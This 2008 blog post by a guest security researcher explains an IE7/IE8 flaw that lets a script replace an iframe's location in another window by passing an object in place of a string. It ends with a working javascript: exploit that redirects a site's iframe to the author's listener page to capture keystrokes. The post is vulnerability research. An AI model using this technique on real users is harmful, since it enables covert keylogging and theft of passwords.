---
title: Ghost Busters
author: pdp
guest: eduardo-vela
date: Thu, 15 May 2008 16:26:48 GMT
template: post.jade
---

> A special guest blogger for this month is Eduardo Vela, also known as sirdarckcat, a security researcher from Mexico. Eduardo has been on the field for a couple of years, mainly focusing on web-app based vulnerabilities, privilege escalation, and IDS/filter evasion. Today, he is a student of computer sciences, does some research on his free time, and works for an important website as a security engineer. These are his words:

There a few conferences that are privately held (invite-only) and their level is commonly very high. One of them is Microsoft's BlueHat conference. BlueHat is an "internal Microsoft event", but they invite a lot of security researchers from around the world. A couple of friends presented in there, and well, apparently it was really fun. Anyway, there was a specific talk that caught our attention, more specifically Manuel Caballero's "A resident in my domain". The description of his talk was really intriguing:

> Do you believe in ghosts? Imagine an invisible script that silently follows you while you surf, even after changing the URL 1,000 times and you are feeling completely safe. Now imagine that the ghost is able to see everything you do, including what you are surfing and what you are typing (passwords included), and even guess your next move.
> No downloading required, no user confirmation, no ActiveX. In other words: no strings attached. We will examine the power of a resident script and the power of a global cross-domain. Also, we will go through the steps of how to find cross-domains and resident scripts.

Apparently, Caballero found a way of capturing keystrokes and window's location. This means that he "at least" has access to modify `document.onkeydown`, and read `window.location`, but if he could modify `document.onkeydown`, that would mean he has access to execute arbitrary code on other's domains context, so that's not it.. because if that was the case, he wouldn't be able to just capture keystrokes, but to UXSS (Universal XSS) the browser.

Anyway, the two things he claims to be able to manipulate can also be manipulated from an off-domain `iframe`. So if there's some way of changing the location of an `iframe`, to any `iframe` we want, then we would be able to capture keystrokes on our own window. So, we now need a way of changing the location of an `iframe`, but first we need to get a reference to the window where the `iframe`s stay, without loosing the script run-time execution. So there are 2 main ways of getting a reference to a window:

```javascript
x=open().window
x=window.opener
```

Both require the user to open a new window and they work exactly the same way. So if you manage to make the user open a new window, then it doesn't matter where the user is navigating to, (if both windows remains open, anyway if the users close them, you can reopen&blur) you have them. So how do we do that? We need to get a reference to the `iframe`s. The ways of doing so are:

```javascript
document.getElementsByTagName("iframe") {doesnt work on cross-domain calls}
window.frames[] {works on cross-domain calls}
```

Now we just need to modify the location. This is trivial, just changing `window.opener.frames[0].location="new location"` shold work. On a recent versions of IE7 and IE8 this method doesn't work. When you try this, the browser will open a new window and by doing so, not modifying the location of the `iframe`.

After doing some tests, the location DOES gets changed when the setted location is not a string. We have hte following options:

```javascript
window.opener.frames[0].location=123;
window.opener.frames[0].location=window;
window.opener.frames[0].location=location;
```

Works fine! But why? Well, apparently IE7&8 have a protection against setting locations by off-domain scripts, and this protection is.. "if the setted location is a string, throw an Error". Not good! We have a lot of ways of making a `String` to look like an `Object`. For example.

```javascript
new String("some-string");
{toString:function(){return "some-string";}}
new function(){this.toString=function(){return "some-string";}}
```

This way, we bypass IE's protection and set our desired location without any problems. And the final exploit goes like this:

```javascript
javascript:x=open('http://hackademix.net/');setInterval(function(){try{x.frames[0].location={toString:function(){return 'http://www.sirdarckcat.net/caballero-listener.html';}}}catch(e){}},5000);void(1);
```

What caballero-listener does is just focusing itself, so it can catches `onkeydown` events.. there are a lot of ways of making the same thing in more stealth mode.
